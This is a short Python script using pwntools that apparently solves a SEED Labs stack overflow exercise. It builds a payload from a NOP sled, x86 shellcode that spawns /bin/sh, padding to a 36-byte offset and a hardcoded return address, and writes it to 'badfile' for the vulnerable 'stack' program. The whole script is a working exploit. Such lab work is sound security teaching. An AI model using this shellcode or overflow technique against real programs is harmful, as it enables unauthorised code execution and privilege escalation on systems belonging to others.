#!/usr/bin/env python3
from pwn import *

# Simpler approach: smaller payload
buffer_addr = 0xffffcce8
ret_offset = 36

# Use shellcode without null bytes
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
print(f"[+] Shellcode length: {len(shellcode)} bytes")

# Build payload: NOPs + shellcode, then padding, then return address
nop_sled = b'\x90' * 10  # Smaller NOP sled
payload = nop_sled + shellcode

# Pad to return address
padding = ret_offset - len(payload)
if padding > 0:
    payload += b'A' * padding

# Return address points to start of buffer (into NOPs)
ret_addr = buffer_addr + 4  # Jump a bit into the NOPs
payload += p32(ret_addr)

# Fill rest
payload += b'C' * (517 - len(payload))

print(f"[+] Payload length: {len(payload)} bytes")
print(f"[+] Return address: {hex(ret_addr)}")

with open('../vulnerable-programs/seedlabs-stack/badfile', 'wb') as f:
    f.write(payload)

print("[+] Done! Run: cd ../vulnerable-programs/seedlabs-stack && ./stack")
